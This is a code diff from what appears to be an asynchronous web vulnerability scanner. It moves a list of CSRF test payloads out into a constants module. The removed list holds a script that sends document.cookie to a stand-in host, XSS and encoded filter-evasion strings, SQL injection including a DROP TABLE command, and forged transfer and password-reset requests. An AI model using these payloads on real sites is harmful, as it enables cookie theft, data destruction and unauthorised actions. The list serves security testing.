@@ -1,45 +1,7 @@
 import asyncio
 import aiohttp
 from config.config import logger
-
-# Extended CSRF payloads (attack vectors)
-CSRF_PAYLOADS = [
-    # Basic XSS payloads (common in reflected CSRF)
-    "<img src='javascript:alert(\"CSRF\");'>",
-    "<script>window.location='http://malicious.com/steal?c='+document.cookie</script>",
-    
-    # Form-based actions (POST payloads)
-    "action=transfer&amount=10000&recipient=attacker@example.com",
-    "delete_account=true",
-    "new_email=attacker@example.com",
-    
-    # JSON payloads (for API endpoints)
-    '{"action": "update", "balance": "0", "user": "admin"}',
-    '{"command": "reset_password", "new_password": "hacked"}',
-    
-    # Encoded payloads to bypass basic filters
-    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",  # URL-encoded script tag
-    "a%09ction=transfer%20to=malicious",         # Tab character and space evasion
-    
-    # Long payloads to test input sanitization
-    "a" * 1000 + "<script>alert('XSS')</script>",
-    
-    # SQL-like patterns (to test parameter misuse)
-    "' OR '1'='1; --",
-    "'; DROP TABLE users; --",
-    
-    # File upload exploitation
-    "file=<script>alert('XSS')</script>.jpg",
-    
-    # Session manipulation
-    "session_id=malicious_session_token",
-    
-    # Parameter pollution (multiple values)
-    "param=value1&param=value2",
-    
-    # Unicode evasion (e.g., UTF-8 BOM)
-    "\xEF\xBB\xBF<script>alert('XSS')</script>"
-]
+from utils.constants import CSRF_PAYLOADS
 
 async def check_csrf(target_url: str, param: str, payload: str, session: aiohttp.ClientSession) -> dict:
     """Check individual CSRF payload asynchronously"""
